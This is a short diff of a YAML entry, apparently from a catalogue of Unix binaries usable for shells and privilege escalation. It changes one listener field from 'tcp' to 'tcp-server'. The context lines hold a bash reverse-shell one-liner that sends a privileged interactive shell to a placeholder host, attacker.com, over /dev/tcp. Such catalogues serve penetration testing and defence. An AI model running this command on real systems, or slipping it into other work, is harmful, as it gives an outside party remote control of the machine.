@@ -86,7 +86,7 @@ functions:
         code: |-
           bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1'
       unprivileged:
-    listener: tcp
+    listener: tcp-server
   shell:
   - code: |-
       bash
